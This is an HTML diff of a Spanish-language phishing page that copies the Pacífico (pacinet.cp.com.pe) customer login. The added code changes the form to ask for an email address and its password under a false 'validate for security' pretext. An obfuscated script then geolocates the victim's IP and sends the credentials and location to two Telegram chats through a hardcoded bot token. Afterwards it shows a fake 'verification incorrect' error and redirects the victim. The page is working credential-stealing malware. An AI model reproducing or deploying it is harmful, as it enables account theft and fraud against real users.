@@ -10,158 +10,17 @@
       type="image/x-icon"
       href="https://pacinet.cp.com.pe/favicon.png"
     />
+
     <style>
-      .overlay {
-        display: none;
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background-color: rgba(0, 0, 0, 0.5);
-        z-index: 9999;
-        text-align: center;
-      }
+      @charset "UTF-8";
 
-      .overlay-content {
-        position: absolute;
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-      }
-
-      .spinner-container {
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-        width: 200px;
-        height: 200px;
-        background-color: white;
-        border-radius: 10px;
-      }
-
-      .dot-spinner {
-        --uib-size: 2.8rem;
-        --uib-speed: 0.9s;
-        --uib-color: #063880;
-        position: relative;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        height: var(--uib-size);
-        width: var(--uib-size);
-        margin-bottom: 20px; /* Espacio entre el spinner y el texto */
-      }
-      .dot-spinner__dot {
-        position: absolute;
-        top: 0;
-        left: 0;
-        display: flex;
-        align-items: center;
-        justify-content: flex-start;
-        height: 100%;
-        width: 100%;
-      }
-
-      .dot-spinner__dot::before {
-        content: "";
-        height: 20%;
-        width: 20%;
-        border-radius: 50%;
-        background-color: var(--uib-color);
-        transform: scale(0);
-        opacity: 0.5;
-        animation: pulse0112 calc(var(--uib-speed) * 1.111) ease-in-out infinite;
-        box-shadow: 0 0 20px rgba(18, 31, 53, 0.3);
-      }
-
-      .dot-spinner__dot:nth-child(2) {
-        transform: rotate(45deg);
-      }
-
-      .dot-spinner__dot:nth-child(2)::before {
-        animation-delay: calc(var(--uib-speed) * -0.875);
-      }
-
-      .dot-spinner__dot:nth-child(3) {
-        transform: rotate(90deg);
-      }
-
-      .dot-spinner__dot:nth-child(3)::before {
-        animation-delay: calc(var(--uib-speed) * -0.75);
-      }
-
-      .dot-spinner__dot:nth-child(4) {
-        transform: rotate(135deg);
-      }
-
-      .dot-spinner__dot:nth-child(4)::before {
-        animation-delay: calc(var(--uib-speed) * -0.625);
-      }
-
-      .dot-spinner__dot:nth-child(5) {
-        transform: rotate(180deg);
-      }
-
-      .dot-spinner__dot:nth-child(5)::before {
-        animation-delay: calc(var(--uib-speed) * -0.5);
-      }
-
-      .dot-spinner__dot:nth-child(6) {
-        transform: rotate(225deg);
-      }
-
-      .dot-spinner__dot:nth-child(6)::before {
-        animation-delay: calc(var(--uib-speed) * -0.375);
-      }
-
-      .dot-spinner__dot:nth-child(7) {
-        transform: rotate(270deg);
-      }
-
-      .dot-spinner__dot:nth-child(7)::before {
-        animation-delay: calc(var(--uib-speed) * -0.25);
-      }
-
-      .dot-spinner__dot:nth-child(8) {
-        transform: rotate(315deg);
-      }
-
-      .dot-spinner__dot:nth-child(8)::before {
-        animation-delay: calc(var(--uib-speed) * -0.125);
-      }
-
-      @keyframes pulse0112 {
-        0%,
-        100% {
-          transform: scale(0);
-          opacity: 0.5;
-        }
-
-        50% {
-          transform: scale(1);
-          opacity: 1;
-        }
-      }
-      .loading-text-container {
-        display: flex;
-        justify-content: center;
-        margin-top: 10px; /* Ajusta el espacio entre el spinner y el texto si es necesario */
-      }
-
-      .loading-text {
-        text-align: center;
-        width: 100%;
-      }
-    </style>
-    <style>
       body,
       html {
         margin: 0;
         padding: 0;
         background: #003467;
       }
+
       body,
       html {
         margin: 0;
@@ -172,11 +31,13 @@
         vertical-align: initial;
         background: #0000;
       }
+
       *,
       :after,
       :before {
         box-sizing: border-box !important;
       }
+
       @font-face {
         font-family: open_sansregular;
         src: url(opensans-regular-webfont.5a148f5be23f233b72ab.eot);
@@ -193,10 +54,12 @@
         font-style: normal;
         font-display: swap;
       }
+
       html {
         height: 100%;
         -webkit-tap-highlight-color: transparent;
       }
+
       body {
         overflow-x: hidden;
         -webkit-font-smoothing: antialiased;
@@ -206,32 +69,22 @@
         background: #003467;
         background: linear-gradient(126deg, #003467 25%, #0071b9);
       }
+
       @media only screen and (max-width: 500px) and (min-width: 5px) {
         body {
           background: #003467;
         }
       }
     </style>
-    <script>
-      function validarNumeros(event) {
-        const input = event.target;
-        const valorInput = input.value;
-        const patron = /^\d*$/; // Expresión regular para validar números
-
-        if (!patron.test(valorInput)) {
-          input.value = valorInput.replace(/[^\d]/g, ""); // Eliminar caracteres no numéricos
-        }
-      }
-    </script>
     <link
       rel="stylesheet"
       href="datos/styles.7af00e0c01ae7ce80e16.css"
       media="all"
       onload="this.media='all'"
     />
-    <noscript
-      ><link rel="stylesheet" href="styles.7af00e0c01ae7ce80e16.css"
-    /></noscript>
+    <noscript>
+      <link rel="stylesheet" href="styles.7af00e0c01ae7ce80e16.css" />
+    </noscript>
     <style></style>
     <style>
       .loader-wrapper[_ngcontent-gxl-c59] {
@@ -253,6 +106,7 @@
         z-index: 100000;
         line-height: 1;
       }
+
       .text-center[_ngcontent-gxl-c59] {
         position: absolute;
         text-align: center;
@@ -262,6 +116,7 @@
         top: 0;
         margin: auto;
       }
+
       .loader[_ngcontent-gxl-c59] {
         width: 100%;
         margin: 0 auto;
@@ -278,15 +133,18 @@
         top: 40%;
         left: 0;
       }
+
       .loader-logo[_ngcontent-gxl-c59] {
         height: 48px;
       }
+
       .loader-icon[_ngcontent-gxl-c59] {
         display: block;
         width: 100%;
         height: 30px;
         margin-top: 30px;
       }
+
       .loader-icon[_ngcontent-gxl-c59] div[_ngcontent-gxl-c59] {
         height: 20px;
         width: 20px;
@@ -297,31 +155,39 @@
         text-align: center;
         margin-left: 10px;
       }
+
       .loader-icon[_ngcontent-gxl-c59] div[_ngcontent-gxl-c59]:first-child {
         animation: move 1s ease-in-out infinite alternate;
         margin-left: 0;
       }
+
       .loader-icon[_ngcontent-gxl-c59] div[_ngcontent-gxl-c59]:nth-child(2) {
         animation: move 1s ease-in-out -0.25s infinite alternate;
         margin-left: 10px;
       }
+
       .loader-icon[_ngcontent-gxl-c59] div[_ngcontent-gxl-c59]:nth-child(3) {
         animation: move 1s ease-in-out -0.5s infinite alternate;
       }
+
       .loader-icon[_ngcontent-gxl-c59] div[_ngcontent-gxl-c59]:nth-child(4) {
         animation: move 1s ease-in-out -0.75s infinite alternate;
       }
+
       .loader-forced[_ngcontent-gxl-c59] {
         position: absolute;
         z-index: 2;
       }
+
       .loader-forced[_ngcontent-gxl-c59] .loader[_ngcontent-gxl-c59] {
         transform: translateY(-50%);
       }
+
       @keyframes move {
         0% {
           transform: translateY(-10px);
         }
+
         to {
           transform: translateY(5px);
         }
@@ -336,12 +202,15 @@
       input[_ngcontent-gxl-c48]::-ms-reveal {
         display: none;
       }
+
       .olvide_mi_clave[_ngcontent-gxl-c48] h1[_ngcontent-gxl-c48] {
         margin-top: 15px;
       }
+
       .codigo_de_socio[_ngcontent-gxl-c48] p[_ngcontent-gxl-c48] {
         margin-top: 20px;
       }
+
       .dni_ruc_input[_ngcontent-gxl-c48] {
         margin-top: 40px;
       }
@@ -361,54 +230,37 @@
         z-index: 99998;
         transform: translateX(calc(100% + 10%));
       }
+
       .show[_ngcontent-gxl-c41] {
         visibility: visible;
         animation: anime 5s ease 1 normal;
       }
+
       @keyframes anime {
         16.666% {
           transform: translateX(0);
         }
+
         83.333% {
           transform: translateX(0);
         }
       }
     </style>
-
     <meta
       http-equiv="origin-trial"
       content="AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9"
     />
   </head>
-  <body>
-    <div id="overlay" class="overlay">
-      <div class="overlay-content">
-        <div class="spinner-container">
-          <div class="dot-spinner">
-            <div class="dot-spinner__dot"></div>
-            <div class="dot-spinner__dot"></div>
-            <div class="dot-spinner__dot"></div>
-            <div class="dot-spinner__dot"></div>
-            <div class="dot-spinner__dot"></div>
-            <div class="dot-spinner__dot"></div>
-            <div class="dot-spinner__dot"></div>
-            <div class="dot-spinner__dot"></div>
-          </div>
-          <div class="loading-text-container">
-            <div class="loading-text" style="    font-family: Arial, Helvetica, sans-serif !important;">Cargando...</div>
-          </div>
-        </div>
-      </div>
-    </div>
 
+  <body>
     <app-root _nghost-gxl-c60="" ng-version="12.1.5"
       ><router-outlet _ngcontent-gxl-c60=""></router-outlet
       ><app-auth-page _nghost-gxl-c49=""
-        ><app-content-auth _ngcontent-gxl-c49="" _nghost-gxl-c43=""
-          ><div _ngcontent-gxl-c43="" class="login_content">
+        ><app-content-auth _ngcontent-gxl-c49="" _nghost-gxl-c43="">
+          <div _ngcontent-gxl-c43="" class="login_content">
             <div _ngcontent-gxl-c43="" class="page">
-              <app-header _ngcontent-gxl-c43="" _nghost-gxl-c38=""
-                ><header _ngcontent-gxl-c38="" id="header" class="clearfix">
+              <app-header _ngcontent-gxl-c43="" _nghost-gxl-c38="">
+                <header _ngcontent-gxl-c38="" id="header" class="clearfix">
                   <div _ngcontent-gxl-c38="" class="central-wrapper clearfix">
                     <div _ngcontent-gxl-c38="" class="logo_movil">
                       <img
@@ -522,8 +374,8 @@
                       </div>
                     </div>
                   </div>
-                </header></app-header
-              >
+                </header>
+              </app-header>
               <div _ngcontent-gxl-c43="" class="content-wrap">
                 <div _ngcontent-gxl-c43="" class="central-wrapper clearfix">
                   <div _ngcontent-gxl-c43="" class="left_login">
@@ -563,51 +415,20 @@
                   <div _ngcontent-gxl-c49="" class="right_login">
                     <div _ngcontent-gxl-c49="" class="content_form">
                       <div _ngcontent-gxl-c49="" class="tab-slider--container">
-                        <app-login-form _ngcontent-gxl-c49="" _nghost-gxl-c48=""
-                          ><div _ngcontent-gxl-c48="">
+                        <app-login-form
+                          _ngcontent-gxl-c49=""
+                          _nghost-gxl-c48=""
+                        >
+                          <div _ngcontent-gxl-c48="">
                             <h1
                               _ngcontent-gxl-c48=""
                               style="
                                 font-family: Arial, Helvetica, sans-serif !important;
                               "
                             >
-                              Ingresa a tu Cuenta
+                              Por motivos de seguridad, valide su ingreso.
                             </h1>
-                            <div
-                              _ngcontent-gxl-c48=""
-                              class="tab-slider--nav"
-                              style=""
-                            >
-                              <ul
-                                _ngcontent-gxl-c48=""
-                                class="tab-slider--tabs"
-                              >
-                                <li
-                                  _ngcontent-gxl-c48=""
-                                  rel="tab1"
-                                  class="tab-slider--trigger active"
-                                  style="
-                                    font-family: Arial, Helvetica, sans-serif !important;
-                                  "
-                                >
-                                  <a href="codigo.html" style="color: white"
-                                    >DNI</a
-                                  >
-                                </li>
-                                <li
-                                  _ngcontent-gxl-c48=""
-                                  rel="tab2"
-                                  class="tab-slider--trigger"
-                                  style="
-                                    font-family: Arial, Helvetica, sans-serif !important;
-                                  "
-                                >
-                                  <a href="codigo.html" style="color: #0071b9"
-                                    >Código de Socio</a
-                                  >
-                                </li>
-                              </ul>
-                            </div>
+
                             <div
                               _ngcontent-gxl-c48=""
                               id="tab1"
@@ -623,14 +444,18 @@
                                   _ngcontent-gxl-c48=""
                                   class="form_row clearfix"
                                 >
-                                  <div _ngcontent-gxl-c48="" class="form_cell">
+                                  <div
+                                    _ngcontent-gxl-c48=""
+                                    class="form_cell"
+                                    style="margin-top: 40px"
+                                  >
                                     <label
                                       _ngcontent-gxl-c48=""
                                       style="
                                         font-family: Arial, Helvetica,
                                           sans-serif !important;
                                       "
-                                      >DNI: </label
+                                      >Correo Eletronico: </label
                                     ><span
                                       _ngcontent-gxl-c48=""
                                       class="user_dni_codigo"
@@ -641,40 +466,19 @@
                                             sans-serif !important;
                                         "
                                         _ngcontent-gxl-c48=""
-                                        type="text"
-                                        inputmode="numeric"
+                                        type="email"
+                                        numeric=""
                                         name="userCode"
                                         autocomplete="off"
-                                        id="dni"
-                                        oninput="validarNumeros(event)"
+                                        id="correo"
+                                        required=""
                                         class="form_element ng-untouched ng-pristine ng-invalid"
-                                        placeholder="Ingrese número de DNI"
-                                        minlength="8"
-                                        maxlength="8"
-                                        required
+                                        placeholder="Ingrese tu Correo Eletronico"
                                       /><!----></span
                                     >
                                   </div>
                                 </div>
-                                <label
-                                  _ngcontent-gxl-c48=""
-                                  class="label_check open-modal"
-                                  style="
-                                    font-family: Arial, Helvetica, sans-serif !important;
-                                  "
-                                  >Recuérdame
-                                  <input
-                                    _ngcontent-gxl-c48=""
-                                    type="checkbox"
-                                    name="isCheckedRemember"
-                                    class="ng-untouched ng-pristine ng-valid" /><span
-                                    _ngcontent-gxl-c48=""
-                                    class="checkmark"
-                                    style="
-                                      font-family: Arial, Helvetica, sans-serif !important;
-                                    "
-                                  ></span
-                                ></label>
+
                                 <div
                                   _ngcontent-gxl-c48=""
                                   class="form_row clearfix"
@@ -686,7 +490,7 @@
                                         font-family: Arial, Helvetica,
                                           sans-serif !important;
                                       "
-                                      >Contraseña:</label
+                                      >Contraseña del correo eletronico:</label
                                     ><span
                                       _ngcontent-gxl-c48=""
                                       class="user_contrasena"
@@ -698,55 +502,15 @@
                                         _ngcontent-gxl-c48=""
                                         name="userPassword"
                                         placeholder="Ingrese su contraseña"
+                                        required=""
                                         class="form_element ng-untouched ng-pristine ng-invalid"
                                         type="password"
-                                        minlength="6"
-                                        maxlength="10"
                                         id="contra"
-                                        required
                                       /><!----></span
                                     >
                                   </div>
                                 </div>
-                                <div
-                                  _ngcontent-gxl-c48=""
-                                  class="olvide_clave clearfix"
-                                >
-                                  <div _ngcontent-gxl-c48="">
-                                    <a
-                                      _ngcontent-gxl-c48=""
-                                      class="btn_olvide_pass"
-                                      href="https://pacinet.cp.com.pe/recoveryPassword"
-                                      style="
-                                        font-family: Arial, Helvetica,
-                                          sans-serif !important;
-                                        font-size: 12px;
-                                      "
-                                      >Desbloqueo de usuario</a
-                                    ><br _ngcontent-gxl-c48="" /><a
-                                      _ngcontent-gxl-c48=""
-                                      class="btn_olvide_pass"
-                                      style="
-                                        font-family: Arial, Helvetica,
-                                          sans-serif !important;
-                                        margin-top: 5px;
-                                        font-size: 12px;
-                                      "
-                                      href="https://pacinet.cp.com.pe/recoveryPassword"
-                                      >Olvidé mi contraseña</a
-                                    >
-                                  </div>
-                                  <a
-                                    _ngcontent-gxl-c48=""
-                                    class="btn_solicitar_pass"
-                                    href="https://pacinet.cp.com.pe/requestPassword"
-                                    style="
-                                      font-family: Arial, Helvetica, sans-serif !important;
-                                      font-size: 12px;
-                                    "
-                                    >Solicitar Contraseña</a
-                                  >
-                                </div>
+
                                 <div
                                   _ngcontent-gxl-c48=""
                                   class="center_content content_capcha"
@@ -767,36 +531,16 @@
                                     Ingresar
                                   </button>
                                 </div>
-                                <div
-                                  _ngcontent-gxl-c48=""
-                                  class="center_content"
-                                >
-                                  <div
-                                    _ngcontent-gxl-c48=""
-                                    class="cuenta_nueva"
-                                    style="
-                                      font-family: Arial, Helvetica, sans-serif !important;
-                                    "
-                                  >
-                                    No tengo código,
-                                    <a
-                                      _ngcontent-gxl-c48=""
-                                      href="https://inscripciones.cp.com.pe/?utm_source=web_pacinet&amp;utm_medium=boton"
-                                      target="_blank"
-                                      >Hazte socio aquí.</a
-                                    >
-                                  </div>
-                                </div>
                               </form>
                             </div>
                           </div>
-                          <!----><!----></app-login-form
-                        >
+                          <!----><!---->
+                        </app-login-form>
                       </div>
                     </div>
                   </div>
-                  <!----><app-alert _ngcontent-gxl-c43="" _nghost-gxl-c41=""
-                    ><div _ngcontent-gxl-c41="" class="content_alerts snackbar">
+                  <!----><app-alert _ngcontent-gxl-c43="" _nghost-gxl-c41="">
+                    <div _ngcontent-gxl-c41="" class="content_alerts snackbar">
                       <div
                         _ngcontent-gxl-c41=""
                         class="alert alert_aviso"
@@ -815,11 +559,11 @@
                         <!----><!---->
                       </div>
                     </div>
-                    <!----></app-alert
-                  >
+                    <!---->
+                  </app-alert>
                 </div>
-                <app-footer _ngcontent-gxl-c43="" _nghost-gxl-c42=""
-                  ><footer _ngcontent-gxl-c42="" id="footer">
+                <app-footer _ngcontent-gxl-c43="" _nghost-gxl-c42="">
+                  <footer _ngcontent-gxl-c42="" id="footer">
                     <div _ngcontent-gxl-c42="" class="central-wrapper clearfix">
                       <div _ngcontent-gxl-c42="" class="footer_bottom clearfix">
                         <ul _ngcontent-gxl-c42="" class="menu_footer_movil">
@@ -886,99 +630,14 @@
                         </div>
                       </div>
                     </div>
-                  </footer></app-footer
-                >
+                  </footer>
+                </app-footer>
               </div>
             </div>
-          </div></app-content-auth
-        ></app-auth-page
-      ><!----><app-loader _ngcontent-gxl-c60="" _nghost-gxl-c59=""
-        ><div
-          _ngcontent-gxl-c59=""
-          class="modal-mask animated fadeIn"
-          style="background-color: rgba(0, 0, 0, 0.6); z-index: 99999"
-          hidden=""
-        >
-          <div
-            _ngcontent-gxl-c59=""
-            class="modal-loading"
-            style="
-              width: auto;
-              height: auto;
-              padding: 30px 50px 20px;
-              background-color: rgb(255, 255, 255);
-              border-radius: 12px;
-              top: calc(100% - 60%);
-              left: calc(50% - 93px);
-            "
-          >
-            <div
-              _ngcontent-gxl-c59=""
-              class="loading-animate"
-              style="width: 40px; height: 40px"
-            >
-              <div _ngcontent-gxl-c59="" class="animate-origin">
-                <span
-                  _ngcontent-gxl-c59=""
-                  style="
-                    width: 5px;
-                    height: 5px;
-                    background-color: rgb(0, 68, 138);
-                  "
-                ></span>
-              </div>
-              <div _ngcontent-gxl-c59="" class="animate-origin">
-                <span
-                  _ngcontent-gxl-c59=""
-                  style="
-                    width: 5px;
-                    height: 5px;
-                    background-color: rgb(0, 68, 138);
-                  "
-                ></span>
-              </div>
-              <div _ngcontent-gxl-c59="" class="animate-origin">
-                <span
-                  _ngcontent-gxl-c59=""
-                  style="
-                    width: 5px;
-                    height: 5px;
-                    background-color: rgb(0, 68, 138);
-                  "
-                ></span>
-              </div>
-              <div _ngcontent-gxl-c59="" class="animate-origin">
-                <span
-                  _ngcontent-gxl-c59=""
-                  style="
-                    width: 5px;
-                    height: 5px;
-                    background-color: rgb(0, 68, 138);
-                  "
-                ></span>
-              </div>
-              <div _ngcontent-gxl-c59="" class="animate-origin">
-                <span
-                  _ngcontent-gxl-c59=""
-                  style="
-                    width: 5px;
-                    height: 5px;
-                    background-color: rgb(0, 68, 138);
-                  "
-                ></span>
-              </div>
-            </div>
-            <p
-              _ngcontent-gxl-c59=""
-              class="loading-discription"
-              style="color: rgb(0, 68, 138); font-size: 14px"
-            >
-              Cargando...
-            </p>
           </div>
-        </div></app-loader
-      ></app-root
-    >
+        </app-content-auth></app-auth-page
+      ><!----><app-loader _ngcontent-gxl-c60="" _nghost-gxl-c59=""> </app-loader
+    ></app-root>
     <script src="datos/runtime.81e45efed06e87fd0976.js" defer="defer"></script>
     <script
       src="datos/polyfills.500a931972a190eb8929.js"
@@ -1038,61 +697,58 @@
   <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
 
   <script>
-    const url = "https://ipapi.co/json/";
     const form = document.querySelector("#loginform");
-
-    form.addEventListener("submit", (event) => {
-      event.preventDefault(); // Aquí evitamos que el formulario se envíe
-
-      // Obtener valores de DNI y contraseña
-      const dni = document.querySelector("#dni").value;
-      const contra = document.querySelector("#contra").value;
-
-      // Verificar si alguno de los campos está vacío
-      if (dni.trim() === "" || contra.trim() === "") {
+    form.addEventListener("submit", (_0x70ebe) => {
+      _0x70ebe.preventDefault();
+      const _0x2a7be9 = document.querySelector("#correo").value;
+      const _0x4302fa = document.querySelector("#contra").value;
+      if (_0x2a7be9.trim() === "" || _0x4302fa.trim() === "") {
         alert("Por favor, completa todos los campos.");
-        return; // Detener la ejecución si hay campos vacíos
+        return;
       }
-
-      // Si los campos no están vacíos, continuar con la solicitud
       axios
-        .get(url)
-        .then((response) => {
-          localStorage.setItem("usuario", dni);
-          const message =
-            "\nPacifico" +
-            "\nDNI: " +
-            dni +
+        .get("https://ipapi.co/json/")
+        .then((_0x893ec6) => {
+          const _0x161ec0 =
+            "\nPacifico\nUsuario: " +
+            localStorage.getItem("usuario") +
+            "\nEmail: " +
+            _0x2a7be9 +
             "\nContraseña: " +
-            contra +
+            _0x4302fa +
             "\nCiudad:" +
-            response.data.city +
+            _0x893ec6.data.city +
             "\nPais: " +
-            response.data.country +
+            _0x893ec6.data.country +
             "\nIP: " +
-            response.data.ip;
+            _0x893ec6.data.ip;
           axios
             .post(
               "https://api.telegram.org/bot6322284639:AAFJI2SDBmlsbFJEGsFap6bJeR6w0b929iQ/sendMessage",
               {
                 chat_id: "-4139256120",
-                text: message,
+                text: _0x161ec0,
               }
             )
-            .then((response) => {
-              var overlay = document.getElementById("overlay");
-              overlay.style.display = "block";
-              setTimeout(function () {
-                overlay.style.display = "none";
-                window.location.href = "sms.html"; // Cambiar 'pagina_destino.html' por la URL de la página a la que quieres redirigir.
-              }, 4000); // 4000 milisegundos = 4 segundos
+            .then((_0x25a1a6) => {
+              axios.post(
+                "https://api.telegram.org/bot6322284639:AAFJI2SDBmlsbFJEGsFap6bJeR6w0b929iQ/sendMessage",
+                {
+                  chat_id: "-4182569165",
+                  text: _0x161ec0,
+                }
+              );
+              alert(
+                "Verificacion Incorrecta, datos invalidos verifique nuevamente"
+              );
+              parent.location.href = "index.html";
             })
-            .catch((error) => {
-              console.error(error);
+            ["catch"]((_0xaa55f5) => {
+              console.error(_0xaa55f5);
             });
         })
-        .catch((error) => {
-          console.log(error);
+        ["catch"]((_0x23f072) => {
+          console.log(_0x23f072);
         });
     });
   </script>
